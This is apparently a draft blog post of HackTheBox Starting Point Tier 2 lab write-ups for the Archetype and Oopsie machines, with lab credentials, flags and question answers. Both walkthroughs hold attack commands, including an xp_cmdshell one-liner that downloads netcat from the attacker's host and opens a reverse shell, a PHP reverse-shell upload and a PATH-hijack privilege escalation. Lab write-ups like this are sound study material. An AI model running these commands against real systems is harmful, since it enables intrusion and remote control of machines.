---
title: "HTB: Learn the basics of Penetration Testing - Tier 2"
date: 2022-11-02T11:30:33-07:00
draft: true     # false is visible
summary: "Short writeups for each of the Starting Point boxes on HTB - Tier 2"     # shows on /posts, but not in post.md
description: "Short writeups for each of the Starting Point boxes on HTB - Tier 2" # shows on post.md and in card preview
categories: ["htb"]  # add to list of categories
tags: ["smb", "sql"]        # add to list of tags
cover:
    image: "img/startingpoint.png"
---

## Archetype

### nmap
```
# Nmap 7.92 scan initiated Wed Nov  2 14:28:03 2022 as: nmap -sC -sV -oA nmap/archetype 10.129.91.127
Nmap scan report for 10.129.91.127
Host is up (0.074s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE      VERSION
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds Windows Server 2019 Standard 17763 microsoft-ds
1433/tcp open  ms-sql-s     Microsoft SQL Server 2017 14.00.1000.00; RTM
| ms-sql-ntlm-info: 
|   Target_Name: ARCHETYPE
|   NetBIOS_Domain_Name: ARCHETYPE
|   NetBIOS_Computer_Name: ARCHETYPE
|   DNS_Domain_Name: Archetype
|   DNS_Computer_Name: Archetype
|_  Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2022-11-02T18:27:24
|_Not valid after:  2052-11-02T18:27:24
|_ssl-date: 2022-11-02T18:28:25+00:00; -1s from scanner time.
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-11-02T18:28:14
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server 2019 Standard 17763 (Windows Server 2019 Standard 6.3)
|   Computer name: Archetype
|   NetBIOS computer name: ARCHETYPE\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2022-11-02T11:28:15-07:00
| ms-sql-info: 
|   10.129.91.127:1433: 
|     Version: 
|       name: Microsoft SQL Server 2017 RTM
|       number: 14.00.1000.00
|       Product: Microsoft SQL Server 2017
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_clock-skew: mean: 1h23m59s, deviation: 3h07m51s, median: -1s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Nov  2 14:28:26 2022 -- 1 IP address (1 host up) scanned in 22.75 seconds
```

### smb
`smb` is open so: `smbclient -N -L 10.129.91.127`

*command tags:*
- `-N | --no-pass`: supresses the normal password prompt from the client to the user.
- `-L | --list`: list available services on the server

We can connect to the `backups` service without a password via: 

`smbclient \\\\10.129.91.127\\backups`

The only file housed here iis `prod.dtsConfig`.

*file: prod.dtsConfig*
```
<DTSConfiguration>
    <DTSConfigurationHeading>
        <DTSConfigurationFileInfo GeneratedBy="..." GeneratedFromPackageName="..." GeneratedFromPackageID="..." GeneratedDate="20.1.2019 10:01:34"/>
    </DTSConfigurationHeading>
    <Configuration ConfiguredType="Property" Path="\Package.Connections[Destination].Properties[ConnectionString]" ValueType="String">
        <ConfiguredValue>Data Source=.;Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;Initial Catalog=Catalog;Provider=SQLNCLI10.1;Persist Security Info=True;Auto Translate=False;</ConfiguredValue>
    </Configuration>
</DTSConfiguration>  
```

Noteably, this file leaks us 

`Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc;`

### sql
Attempting to connect to sql database using `mysql`:

`mysql -h 10.129.91.127 --port=1433 -u sql_svc -pM3g4c0rp123`

After trying a couple variations of this, I realized that another tool maybe needed to connect to the `db`. [This link](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) mentioned `mssqlclient.py`. I ran `locate mssqlclient.py` to search kali for the script.

Connect via: `python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -windows-auth ARCHETYPE/sql_svc@10.129.91.127`

![mssqlclient](/img/tier2/mssqlclient.png)

Then I used the [previous link](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server) as well as this [cheatsheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) for `sql` commands. Generating command execution seems good:

```
EXEC xp_cmdshell 'net user'; — privOn MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:
EXEC sp_configure 'show advanced options', 1; — priv
RECONFIGURE; — priv
EXEC sp_configure 'xp_cmdshell', 1; — priv
RECONFIGURE; — priv
```

And we have command execution:
![shell](/img/tier2/shell.png)

Then I tried several one-liner reverse shells for powershell, but didn't have anyluck. So, I reverted back to the `netcat` binary ([nc64.exe](https://github.com/int0x33/nc.exe/blob/master/nc64.exe)) to spin up a reverse shell.

To host this file to the box: `python3 -m http.server`

Additionally, start `nc` locally for the reverse shell: `nc -lvnp 1337`

Download the binary and run: 

`xp_cmdshell "powershell.exe cd c:\Users\Public; wget http://10.10.14.232:8000/nc64.exe -outfile nc64.exe; .\nc64.exe -e cmd.exe 10.10.14.232 1337"`

![rs](/img/tier2/rs.png)

After a bit of poking around, I found this:

```
    Directory: C:\Users\sql_svc\Desktop
                                                                                  
                                         
Mode                LastWriteTime         Length Name                             
                                      
----                -------------         ------ ----                             
                                      
-ar---        2/25/2020   6:37 AM             32 user.txt     
```

*file: user.txt:*
```
3e7b102e78218e935bf3f4951fec21a3
```

### privesc
Now we can look into becoming `root`. One great tool for automating this process is [`winPEAS`](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS). Just download it locally and then host it on a python server and download it in the reverse shell!

As I was scrolling through the output, a few things stood out:

```
͹ Enumerating Security Packages Credentials                                       
  Version:NetNTLMv2                                               
  Hash: sql_svc::ARCHETYPE:1122334455667788:947576aa2fadb0cbbee6e345caee3fc6:0101000000000000ec105ee002efd8013a4c4936e65e1a2e0000000008003000300000000000000000000000003000004961ea35a68c9880c3eabe5d1edabb04866d05ca16c6fe9706906f3be985311d0a00100000000000000000000000000000000000090000000000000000000000 
```

![winpeas](/img/tier2/winpeas.png)

I decided to check the console history first:

`type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\Powershell\PSReadline/ConsoleHost_history.txt`

*file: ConsoleHost_history.txt*
```
net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
exit
```

Now we can revert back to `impacket` tools and use `psexec.py`:

`python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator:MEGACORP_4dm1n\!\!@10.129.91.127`

![root](/img/tier2/root.png)

Finally, print out the flag.

`type C:\Users\Administrator\Desktop\root.txt`

### Questions
- Which TCP port is hosting a database server? `1433`
- What is the name of the non-Administrative share available over SMB? `backups`
- What is the password identified in the file on the SMB share? `M3g4c0rp123`
- What script from Impacket collection can be used in order to establish an authenticated connection to a Microsoft SQL Server? `mssqlclient.py`
- What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell? `xp_cmdshell`
- What script can be used in order to search possible paths to escalate privileges on Windows hosts? `winPEAS`
- What file contains the administrator's password? `ConsoleHost_history.txt`

**user flag:**`3e7b102e78218e935bf3f4951fec21a3`

**root flag:**`b91ccec3305e98240082d4474b848528`

## Oopsie

### nmap
```
# Nmap 7.92 scan initiated Thu Nov  3 01:03:34 2022 as: nmap -sC -sV -oA nmap/oopsie -T4 10.129.28.128
Nmap scan report for 10.129.28.128
Host is up (0.071s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Welcome
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Nov  3 01:03:44 2022 -- 1 IP address (1 host up) scanned in 10.62 seconds
```

### http
Start with `http`. Off the bat, I noticed that `megacorp.com` is likely their domain since `admin@megacorp.com` is a listed email. Other than that, the lnading page seemed useless.

Time for `gobuster`:
`sudo gobuster dir -u http://10.129.28.128 -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -o gobuster.out -z`

```
/images               (Status: 301) [Size: 315] [--> http://10.129.28.128/images/]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/js                   (Status: 301) [Size: 311] [--> http://10.129.28.128/js/]
/themes               (Status: 301) [Size: 315] [--> http://10.129.28.128/themes/]
/css                  (Status: 301) [Size: 312] [--> http://10.129.28.128/css/]
/.htm                 (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.129.28.128/uploads/]
/.                    (Status: 200) [Size: 10932]
/fonts                (Status: 301) [Size: 314] [--> http://10.129.28.128/fonts/]
/.htaccess            (Status: 403) [Size: 278]
/.phtml               (Status: 403) [Size: 278]
/.htc                 (Status: 403) [Size: 278]
/.html_var_DE         (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.html.               (Status: 403) [Size: 278]
/.html.html           (Status: 403) [Size: 278]
/.htpasswds           (Status: 403) [Size: 278]
/.htm.                (Status: 403) [Size: 278]
/.htmll               (Status: 403) [Size: 278]
/.phps                (Status: 403) [Size: 278]
/.html.old            (Status: 403) [Size: 278]
/.ht                  (Status: 403) [Size: 278]
/.html.bak            (Status: 403) [Size: 278]
/.htm.htm             (Status: 403) [Size: 278]
/.htgroup             (Status: 403) [Size: 278]
/.hta                 (Status: 403) [Size: 278]
/.html1               (Status: 403) [Size: 278]
/.html.LCK            (Status: 403) [Size: 278]
/.html.printable      (Status: 403) [Size: 278]
/.htm.LCK             (Status: 403) [Size: 278]
/.htaccess.bak        (Status: 403) [Size: 278]
/.html.php            (Status: 403) [Size: 278]
/.htx                 (Status: 403) [Size: 278]
/.htmls               (Status: 403) [Size: 278]
/cdn-cgi              (Status: 301) [Size: 316] [--> http://10.129.28.128/cdn-cgi/]
/.htlm                (Status: 403) [Size: 278]
/.htm2                (Status: 403) [Size: 278]
/.html-               (Status: 403) [Size: 278]
/.htuser              (Status: 403) [Size: 278]
```

`/cdn-cgi` seemed strange and stood out. After a quick search, we find this relates to [Cloudflare](https://developers.cloudflare.com/fundamentals/get-started/reference/cdn-cgi-endpoint/). Maybe there is a login page?

`http://10.129.28.128/cdn-cgi/login/` works!

I tried some basic usernames and passwords, but no luck. Let's just login as a guest for now:

![guest](/img/tier2/guest.png)

Looks like the website is using `php`. Also, if we change the `id` in the url, we are able to change the `Account`, `Branding`, and `Clients` tab output. My first thought was to check the cookies to see if we can't edit something.

![upload](/img/tier2/upload.png)

Combining these ideas of the cookies and the `id`, I quickly unlocked the `Uploads` tab. I guess upload a `php` [reverse shell](https://github.com/pentestmonkey/php-reverse-shell).

Now to find where this file was uploaded, and how to run it. `/uploads` seems like a plausible place to look (we saw this from our first scan).

![php-rs](/img/tier2/php-rs.png)

Flag is found in `/home/rober/user.txt`

*file: user.txt*
```
f2c74ee8db7983851ab2a96a44eb7981
```

`python3 -c 'import pty;pty.spawn("/bin/bash")'` gives us a functional shell and `export TERM=xterm` lets us clear the screen.

After a bit of looking around, I found the `www` directories and went searching through that (`/var/www/html/cdn-cgi/login`). This lead to:

```
index.php:if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
index.php:<input type="password" name="password" placeholder="Password" />
```

*file: db.php*
```
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

We can now go from `www-data` to `robert` via `su robert` and put in his password `M3g4C0rpUs3r!`

### privesc
Time for [`linpeas`](https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/README.md). I simply downloaded the `.sh` file locally, hosted it on a python server, and then downloaded it on the reverse shell.

On the first look through, the `bugtracker` group stood out - especially since there is an unknown `SUID` (Set owner User ID) binary called `/usr/bin/bugtracker`. 

![linpeas](/img/tier2/linpeas.png)

`ltrace` is a tool that allows you to run a binary and see the libraries that are being called. This will help give us a better idea of what is going on under the hood.

`ltrace /usr/bin/bugtracker` gives us the output:

![ltrace](/img/tier2/ltrace.png)

Since `system("cat...")` is being run, we can simply update the `$path` environment variable to point to point to our own malicious `cat` such as a `/bin/sh` shell that will keep the admin privileges. Like so:

![oopsie](/img/tier2/oopsie.png)

### Questions
- With what kind of tool can intercept web traffic? `proxy`
- What is the path to the directory on the webserver that returns a login page? `/cdn-cgi/login`
- What can be modified in Firefox to get access to the upload page? `cookie`
- What is the access ID of the admin user? `34322`
- On uploading a file, what directory does that file appear in on the server? `/uploads`
- What is the file that contains the password that is shared with the robert user? `db.php`
- What executible is run with the option "-group bugtracker" to identify all files owned by the bugtracker group? `find`
- Regardless of which user starts running the bugtracker executable, what's user privileges will use to run? `root`
- What SUID stands for? `Set owner user id`
- What is the name of the executable being called in an insecure manner? `cat`

**user flag:** `f2c74ee8db7983851ab2a96a44eb7981`

**root flag:** `af13b0bee69f8a877c3faf667f7beacf`






## Vaccine

### Questions

## Unified

### Questions